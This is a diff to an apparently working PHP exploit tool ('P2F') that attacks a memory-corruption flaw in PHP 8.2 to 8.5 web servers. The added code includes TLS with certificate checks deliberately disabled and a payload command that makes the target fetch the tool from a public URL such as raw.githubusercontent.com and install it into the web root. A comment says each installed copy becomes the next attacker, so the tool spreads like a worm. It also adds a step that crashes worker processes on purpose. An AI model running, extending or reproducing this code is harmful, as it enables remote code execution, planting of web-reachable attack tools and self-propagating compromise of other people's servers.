@@ -458,6 +458,8 @@ final class P2F
 {
     public string $host = '127.0.0.1';
     public int $port = 80;
+    /** speak TLS (https targets); certificate checks are off on purpose */
+    public bool $tls = false;
     public string $path = '/index.php';
     public string $version = '';        // '' = auto-detect from the leak
     /** how far to sweep the cycle offset between a stage pair */
@@ -466,6 +468,14 @@ final class P2F
     public int $refresh = 8;
     public int $retries = 4;
     public string $callback = '';       // URL the target fetches `?txt` from
+    /**
+     * Publicly reachable copy of this file.  When set, the payload downloads it
+     * straight to `installPath` instead of asking the callback for `?d=1` --
+     * needed whenever the runner is not reachable from the target (e.g. an
+     * internet host attacked from a laptop).  Whatever is in the repo at attack
+     * time is what lands, so push before attacking.
+     */
+    public string $publicSource = '';
     public string $installPath = '/var/www/html/php2fix.php';
     // On by default: a copy that is installed here becomes the next attacker,
     // and running this chain from a web request needs -1 / no time limit.
@@ -521,10 +531,31 @@ final class P2F
     {
         $errno = 0;
         $err = '';
+        $ctx = $this->tls
+            ? stream_context_create(['ssl' => [
+                // We are measuring a target, not trusting it: a self-signed or
+                // mismatched certificate must not stop the chain, but SNI has to
+                // be right or a shared-hosting front end answers with the wrong
+                // vhost.
+                'peer_name' => $this->host,
+                'SNI_enabled' => true,
+                'verify_peer' => false,
+                'verify_peer_name' => false,
+            ]])
+            : null;
         $fp = @stream_socket_client('tcp://' . $this->host . ':' . $this->port,
-                                    $errno, $err, $timeout);
+                                    $errno, $err, $timeout, STREAM_CLIENT_CONNECT, $ctx);
         if ($fp === false) {
             return null;
+        }
+        if ($this->tls) {
+            $ok = @stream_socket_enable_crypto(
+                $fp, true,
+                STREAM_CRYPTO_METHOD_TLSv1_2_CLIENT | STREAM_CRYPTO_METHOD_TLSv1_3_CLIENT);
+            if ($ok !== true) {
+                @fclose($fp);
+                return null;
+            }
         }
         // NB: (int) $timeout truncates 0.25 to 0, which makes the stream
         // non-blocking and every read return '' -- that silently broke the
@@ -1234,6 +1265,18 @@ final class P2F
         if ($this->cmd !== '') {
             return $this->cmd;
         }
+        if ($this->publicSource !== '') {
+            // copy() keeps it one short statement and needs no shell escaping:
+            // the command travels in a ~231-byte slot.
+            $cmd = 'P=$(command -v php||ls /usr/local/bin/php);$P -r '
+                 . escapeshellarg('@copy(' . var_export($this->publicSource, true)
+                                  . ',' . var_export($this->installPath, true) . ');');
+            if (strlen($cmd) <= 231) {
+                return $cmd;
+            }
+            $this->say(sprintf('  public source too long for the payload slot (%d bytes)',
+                               strlen($cmd)));
+        }
         $src = $this->callback !== '' ? $this->callback : '';
         if ($src === '') {
             $src = 'http://127.0.0.1/php2fix.php';
@@ -1361,10 +1404,16 @@ function p2f_exploit(P2F $t): array
             foreach ($pairs as [$name, $v]) {
                 $v = p2f_versions()[$name];
                 $is85 = $v['chain'] === 'a2s';   // (set-specific below)
-                $t->say('  refresh: crash every child -> cold workers');
-                $t->refresh(static fn (): string => $is85
-                    ? $t->b2Body85(0xdead0000, 0xdead0000, 'true')
-                    : $t->b2Body(0xdead0000, 0xdead0000, 'true'));
+                if ($is85) {
+                    // 8.5 only: its dangling struct sits at the default page
+                    // only on a cold worker, and the bogus write is what faults
+                    // a child so the master respawns one.  On 8.2-8.4 the same
+                    // body does not fault anything (measured: identical pids
+                    // before and after) and only perturbs the heap the pair
+                    // needs, so those versions leave the pool alone.
+                    $t->say('  refresh: cold workers for the 8.5 page index');
+                    $t->refresh(static fn (): string => $t->b2Body85(0xdead0000, 0xdead0000, 'true'));
+                }
 
                 $a1 = $is85 ? $t->a1Body85(13, $v['a1']) : $t->a1Body($v['a1']);
                 $info = ['ok' => false, 'why' => '', 'decoded' => 0];
@@ -1528,10 +1577,13 @@ $opts = [
     'path' => (string) ($_POST['path'] ?? '/index.php'),
     'version' => (string) ($_POST['version'] ?? ''),
     'gap' => (int) ($_POST['gap'] ?? 6),
+    'refresh' => (int) ($_POST['refresh'] ?? 8),
+    'tls' => isset($_POST['run']) ? !empty($_POST['tls']) : false,
     'retries' => (int) ($_POST['retries'] ?? 4),
     'callback' => (string) ($_POST['callback'] ?? ''),
     'installPath' => (string) ($_POST['installPath'] ?? '/var/www/html/php2fix.php'),
     'setMemoryLimit' => isset($_POST['run']) ? !empty($_POST['setMemoryLimit']) : true,
+    'publicSource' => (string) ($_POST['publicSource'] ?? ''),
     'cmd' => (string) ($_POST['cmd'] ?? ''),
     'verbose' => true,
     'timeout' => (int) ($_POST['timeout'] ?? 180),
@@ -1550,6 +1602,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['run'])) {
     @ini_set('output_buffering', '0');
     @ini_set('zlib.output_compression', '0');
     @ob_implicit_flush(true);
+    if ($opts['port'] === 443) {
+        $opts['tls'] = $opts['tls'] ?? true;
+    }
     $t = new P2F($opts);
     if ($t->callback === '') {
         $t->callback = p2f_self_url();
@@ -1617,8 +1672,19 @@ $self = p2f_self_url();
   </select>
   <label for="gap">cycle offset sweep</label>
   <input type="number" id="gap" name="gap" min="0" max="16" value="<?= (int) $opts['gap'] ?>">
+  <label for="refresh">pool refresh</label>
+  <input type="number" id="refresh" name="refresh" min="0" max="32"
+         value="<?= (int) $opts['refresh'] ?>"
+         title="bogus writes that fault each child so the master respawns cold workers; 0 = leave the pool alone">
+  <label for="tls">https (TLS)</label>
+  <input type="checkbox" id="tls" name="tls" value="1"<?= !empty($opts['tls']) ? ' checked' : '' ?>>
   <label for="callback">install source URL</label>
   <input type="text" id="callback" name="callback" value="<?= p2f_h($opts['callback'] !== '' ? $opts['callback'] : $self) ?>">
+  <label for="publicSource">public copy URL</label>
+  <input type="text" id="publicSource" name="publicSource" style="width:34rem"
+         placeholder="https://raw.githubusercontent.com/&lt;user&gt;/&lt;repo&gt;/main/php2fix.php"
+         value="<?= p2f_h($opts['publicSource'] ?? '') ?>"
+         title="if the target cannot reach this runner, it downloads the page from here instead">
   <label for="installPath">install path</label>
   <input type="text" id="installPath" name="installPath" value="<?= p2f_h($opts['installPath']) ?>">
   <label for="retries">attempts</label>
